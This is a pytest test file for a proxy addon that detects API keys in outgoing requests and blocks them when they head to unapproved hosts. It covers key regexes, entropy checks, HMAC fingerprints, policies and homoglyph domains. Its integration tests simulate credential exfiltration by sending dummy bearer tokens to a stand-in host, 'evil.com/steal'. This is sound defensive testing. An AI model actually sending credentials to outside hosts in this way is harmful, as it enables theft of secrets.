"""
Tests for credential_guard.py addon.

Tests credential detection, host authorization, and blocking behavior.
"""

import json
import pytest
import tempfile
from pathlib import Path


class TestCredentialRule:
    """Tests for CredentialRule pattern matching."""

    def test_openai_key_pattern(self):
        """Test OpenAI API key pattern detection."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="openai",
            patterns=[r"sk-[a-zA-Z0-9]{20,}"],
            allowed_hosts=["api.openai.com"],
        )

        # Should match valid OpenAI keys
        assert rule.matches("sk-abc123xyz456def789ghi")
        assert rule.matches("Bearer sk-abc123xyz456def789ghi")
        assert rule.matches('{"key": "sk-abc123xyz456def789ghi"}')

        # Should not match short keys or wrong prefix
        assert rule.matches("sk-short") is None
        assert rule.matches("pk-abc123xyz456def789ghi") is None

    def test_anthropic_key_pattern(self):
        """Test Anthropic API key pattern detection."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="anthropic",
            patterns=[r"sk-ant-[a-zA-Z0-9-_]{20,}"],
            allowed_hosts=["api.anthropic.com"],
        )

        assert rule.matches("sk-ant-abc123xyz456def789ghi01")
        assert rule.matches("sk-ant-api03-abcdefghij-1234567890")

        assert rule.matches("sk-ant-short") is None
        assert rule.matches("sk-abc123xyz456def789ghi") is None


class TestHostMatching:
    """Tests for host pattern matching."""

    def test_exact_match(self):
        from addons.credential_guard import matches_host_pattern

        assert matches_host_pattern("api.openai.com", "api.openai.com")
        assert not matches_host_pattern("api.openai.com", "openai.com")

    def test_wildcard_match(self):
        from addons.credential_guard import matches_host_pattern

        assert matches_host_pattern("api.example.com", "*.example.com")
        assert matches_host_pattern("sub.api.example.com", "*.example.com")
        assert matches_host_pattern("example.com", "*.example.com")
        assert not matches_host_pattern("example.org", "*.example.com")

    def test_case_insensitive(self):
        from addons.credential_guard import matches_host_pattern

        assert matches_host_pattern("API.OpenAI.com", "api.openai.com")
        assert matches_host_pattern("api.openai.com", "API.OPENAI.COM")


class TestPathMatching:
    """Tests for path pattern matching."""

    def test_path_wildcard_suffix(self):
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/v1/chat", "/v1/*")
        assert path_matches_pattern("/v1/chat/completions", "/v1/*")
        assert not path_matches_pattern("/v2/chat", "/v1/*")

    def test_path_double_wildcard(self):
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/api/v1/anything", "/api/**")
        assert path_matches_pattern("/api", "/api/**")
        assert not path_matches_pattern("/other/path", "/api/**")

    def test_path_exact_match(self):
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/v1/models", "/v1/models")
        assert not path_matches_pattern("/v1/models/extra", "/v1/models")

    def test_path_full_wildcard(self):
        from addons.credential_guard import path_matches_pattern

        assert path_matches_pattern("/any/path", "/**")
        assert path_matches_pattern("/", "/**")
        assert path_matches_pattern("/any/path", "/*")

    def test_path_normalization(self):
        from addons.credential_guard import path_matches_pattern

        # Double slash normalized
        assert path_matches_pattern("//v1//models", "/v1/models")
        # Trailing slash normalized
        assert path_matches_pattern("/v1/models/", "/v1/models")


class TestShannonEntropy:
    """Tests for entropy calculation."""

    def test_empty_string(self):
        from addons.credential_guard import calculate_shannon_entropy

        assert calculate_shannon_entropy("") == 0.0

    def test_single_char(self):
        from addons.credential_guard import calculate_shannon_entropy

        assert calculate_shannon_entropy("a") == 0.0
        assert calculate_shannon_entropy("aaaa") == 0.0

    def test_two_chars_equal(self):
        from addons.credential_guard import calculate_shannon_entropy

        entropy = calculate_shannon_entropy("ab")
        assert abs(entropy - 1.0) < 0.01

    def test_high_entropy_string(self):
        from addons.credential_guard import calculate_shannon_entropy

        # Random-looking string should have high entropy
        entropy = calculate_shannon_entropy("sk-proj-abc123XYZ789def456GHI")
        assert entropy > 3.5


class TestLooksLikeSecret:
    """Tests for entropy-based secret detection."""

    def test_short_string_rejected(self):
        from addons.credential_guard import looks_like_secret

        config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        assert not looks_like_secret("short", config)

    def test_low_diversity_rejected(self):
        from addons.credential_guard import looks_like_secret

        config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        # Long but repetitive
        assert not looks_like_secret("aaaaaaaaaaaaaaaaaaaaaaaaa", config)

    def test_high_entropy_accepted(self):
        from addons.credential_guard import looks_like_secret

        config = {"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5}
        # Random-looking API key
        assert looks_like_secret("sk-proj-abc123XYZ789def456GHI012jkl", config)


class TestHMACFingerprint:
    """Tests for HMAC fingerprinting."""

    def test_deterministic(self):
        from addons.credential_guard import hmac_fingerprint

        secret = b"test-secret"
        cred = "sk-abc123"

        fp1 = hmac_fingerprint(cred, secret)
        fp2 = hmac_fingerprint(cred, secret)
        assert fp1 == fp2

    def test_different_credentials_different_fingerprints(self):
        from addons.credential_guard import hmac_fingerprint

        secret = b"test-secret"
        fp1 = hmac_fingerprint("sk-abc123", secret)
        fp2 = hmac_fingerprint("sk-xyz789", secret)
        assert fp1 != fp2

    def test_different_secrets_different_fingerprints(self):
        from addons.credential_guard import hmac_fingerprint

        cred = "sk-abc123"
        fp1 = hmac_fingerprint(cred, b"secret1")
        fp2 = hmac_fingerprint(cred, b"secret2")
        assert fp1 != fp2

    def test_fingerprint_length(self):
        from addons.credential_guard import hmac_fingerprint

        fp = hmac_fingerprint("test", b"secret")
        assert len(fp) == 16  # First 16 chars of hex digest


class TestAnalyzeHeaders:
    """Tests for header analysis."""

    def test_detects_known_pattern_in_auth_header(self):
        from addons.credential_guard import analyze_headers, DEFAULT_RULES

        headers = {"Authorization": "Bearer sk-proj-" + "a" * 80}
        detections = analyze_headers(
            headers=headers,
            rules=DEFAULT_RULES,
            safe_headers_config={},
            entropy_config={"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5},
            standard_auth_headers=["authorization"],
            detection_level="standard"
        )

        assert len(detections) == 1
        assert detections[0]["rule_name"] == "openai"
        assert detections[0]["tier"] == 1
        assert detections[0]["confidence"] == "high"

    def test_detects_unknown_entropy_in_standard_mode(self):
        from addons.credential_guard import analyze_headers

        headers = {"X-Api-Key": "unknown-secret-abc123XYZ789def456GHI"}
        detections = analyze_headers(
            headers=headers,
            rules=[],
            safe_headers_config={},
            entropy_config={"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5},
            standard_auth_headers=["x-api-key"],
            detection_level="standard"
        )

        assert len(detections) == 1
        assert detections[0]["rule_name"] == "unknown_secret"
        assert detections[0]["tier"] == 2

    def test_skips_safe_headers(self):
        from addons.credential_guard import analyze_headers

        headers = {"X-Request-Id": "abc123XYZ789def456GHI012jkl345mno"}
        detections = analyze_headers(
            headers=headers,
            rules=[],
            safe_headers_config={"safe_patterns": ["x-request-id"]},
            entropy_config={"min_length": 20, "min_charset_diversity": 0.5, "min_shannon_entropy": 3.5},
            standard_auth_headers=["x-request-id"],
            detection_level="paranoid"
        )

        assert len(detections) == 0


class TestDetermineDecision:
    """Tests for decision engine."""

    def test_allows_known_credential_to_correct_host(self):
        from addons.credential_guard import determine_decision, CredentialRule

        rules = [CredentialRule(name="test", patterns=[r"test-key"], allowed_hosts=["api.example.com"])]

        decision, context = determine_decision(
            credential="test-key",
            rule_name="test",
            host="api.example.com",
            path="/v1/api",
            rules=rules,
            policy={},
            hmac_secret=b"secret"
        )

        assert decision == "allow"

    def test_greylist_mismatch_for_wrong_host(self):
        from addons.credential_guard import determine_decision, CredentialRule

        rules = [CredentialRule(name="test", patterns=[r"test-key"], allowed_hosts=["api.example.com"])]

        decision, context = determine_decision(
            credential="test-key",
            rule_name="test",
            host="evil.com",
            path="/v1/api",
            rules=rules,
            policy={},
            hmac_secret=b"secret"
        )

        assert decision == "greylist_mismatch"
        assert "expected_hosts" in context

    def test_greylist_approval_for_unknown(self):
        from addons.credential_guard import determine_decision

        decision, context = determine_decision(
            credential="unknown-secret",
            rule_name="unknown_secret",
            host="api.example.com",
            path="/v1/api",
            rules=[],
            policy={},
            hmac_secret=b"secret"
        )

        assert decision == "greylist_approval"


class TestCheckPolicyApproval:
    """Tests for policy approval checking."""

    def test_approves_matching_policy(self):
        from addons.credential_guard import check_policy_approval, hmac_fingerprint

        secret = b"test-secret"
        credential = "my-api-key"
        fp = hmac_fingerprint(credential, secret)

        policy = {
            "approved": [
                {"token_hmac": fp, "hosts": ["api.example.com"], "paths": ["/**"]}
            ]
        }

        assert check_policy_approval(credential, "api.example.com", "/v1/test", policy, secret)

    def test_rejects_wrong_host(self):
        from addons.credential_guard import check_policy_approval, hmac_fingerprint

        secret = b"test-secret"
        credential = "my-api-key"
        fp = hmac_fingerprint(credential, secret)

        policy = {
            "approved": [
                {"token_hmac": fp, "hosts": ["api.example.com"], "paths": ["/**"]}
            ]
        }

        assert not check_policy_approval(credential, "evil.com", "/v1/test", policy, secret)

    def test_rejects_wrong_path(self):
        from addons.credential_guard import check_policy_approval, hmac_fingerprint

        secret = b"test-secret"
        credential = "my-api-key"
        fp = hmac_fingerprint(credential, secret)

        policy = {
            "approved": [
                {"token_hmac": fp, "hosts": ["api.example.com"], "paths": ["/v1/*"]}
            ]
        }

        assert not check_policy_approval(credential, "api.example.com", "/v2/test", policy, secret)


class TestPolicyStore:
    """Tests for PolicyStore."""

    def test_loads_yaml_policies(self):
        from addons.credential_guard import PolicyStore

        with tempfile.TemporaryDirectory() as tmpdir:
            policy_dir = Path(tmpdir)
            (policy_dir / "default.yaml").write_text("""
approved:
  - token_hmac: abc123
    hosts: ["api.example.com"]
    paths: ["/**"]
""")

            store = PolicyStore(policy_dir)
            store.load_all()

            policy = store.get_policy("default")
            assert len(policy.get("approved", [])) == 1

    def test_returns_empty_for_missing_project(self):
        from addons.credential_guard import PolicyStore

        with tempfile.TemporaryDirectory() as tmpdir:
            store = PolicyStore(Path(tmpdir))
            store.load_all()

            policy = store.get_policy("nonexistent")
            assert policy == {}


class TestResponseBuilders:
    """Tests for response building."""

    def test_mismatch_response_format(self):
        from addons.credential_guard import create_mismatch_response

        resp = create_mismatch_response(
            credential_type="openai",
            host="evil.com",
            expected_hosts=["api.openai.com"],
            fingerprint="hmac:abc123",
            path="/v1/chat",
        )

        assert resp.status_code == 428
        body = json.loads(resp.content)
        assert body["type"] == "destination_mismatch"
        assert body["credential_type"] == "openai"
        assert "api.openai.com" in body["expected_hosts"]

    def test_approval_response_format(self):
        from addons.credential_guard import create_approval_response

        resp = create_approval_response(
            credential_type="unknown_secret",
            host="api.example.com",
            fingerprint="hmac:abc123",
            path="/v1/api",
            reason="unknown_credential",
        )

        assert resp.status_code == 428
        body = json.loads(resp.content)
        assert body["type"] == "requires_approval"
        assert body["reason"] == "unknown_credential"


class TestCredentialGuardIntegration:
    """Integration tests using mitmproxy test fixtures."""

    def test_blocks_credential_to_wrong_host(self, credential_guard, make_flow):
        """Test that credentials to wrong host are blocked."""
        # Create flow with OpenAI key going to wrong host
        flow = make_flow(
            method="POST",
            url="https://evil.com/steal",
            headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"}
        )

        credential_guard.request(flow)

        # Should be blocked
        assert flow.response is not None
        assert flow.response.status_code == 428
        assert flow.metadata.get("blocked_by") == "credential-guard"

    def test_allows_credential_to_correct_host(self, credential_guard, make_flow):
        """Test that credentials to correct host are allowed."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/v1/chat/completions",
            headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"}
        )

        credential_guard.request(flow)

        # Should not be blocked
        assert flow.response is None

    def test_allows_non_credential_requests(self, credential_guard, make_flow):
        """Test that requests without credentials pass through."""
        flow = make_flow(
            method="GET",
            url="https://example.com/api",
            headers={"Content-Type": "application/json"}
        )

        credential_guard.request(flow)

        assert flow.response is None

    def test_temp_allowlist_works(self, credential_guard, make_flow):
        """Test temp allowlist allows blocked requests."""
        credential = f"sk-proj-{'a' * 80}"

        # First, verify it would be blocked
        flow1 = make_flow(
            method="POST",
            url="https://evil.com/api",
            headers={"Authorization": f"Bearer {credential}"}
        )
        credential_guard.request(flow1)
        assert flow1.response is not None  # Blocked

        # Add to temp allowlist
        credential_guard.add_temp_allowlist(credential, "evil.com", ttl=300)

        # Now should be allowed
        flow2 = make_flow(
            method="POST",
            url="https://evil.com/api",
            headers={"Authorization": f"Bearer {credential}"}
        )
        credential_guard.request(flow2)
        assert flow2.response is None  # Allowed

    def test_stats_increment_on_violation(self, credential_guard, make_flow):
        """Test that violation stats are tracked."""
        initial_count = credential_guard.violations_total

        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"}
        )
        credential_guard.request(flow)

        assert credential_guard.violations_total == initial_count + 1


class TestHomoglyphDetection:
    """Tests for homoglyph attack detection."""

    def test_detects_cyrillic_in_domain(self):
        from addons.credential_guard import detect_homoglyph_attack, HOMOGLYPH_ENABLED

        if not HOMOGLYPH_ENABLED:
            pytest.skip("confusable-homoglyphs not installed")

        # Cyrillic 'а' (U+0430) instead of Latin 'a'
        result = detect_homoglyph_attack("аpi.openai.com")
        assert result is not None
        assert result["dangerous"]

    def test_allows_normal_ascii_domain(self):
        from addons.credential_guard import detect_homoglyph_attack, HOMOGLYPH_ENABLED

        if not HOMOGLYPH_ENABLED:
            pytest.skip("confusable-homoglyphs not installed")

        result = detect_homoglyph_attack("api.openai.com")
        assert result is None
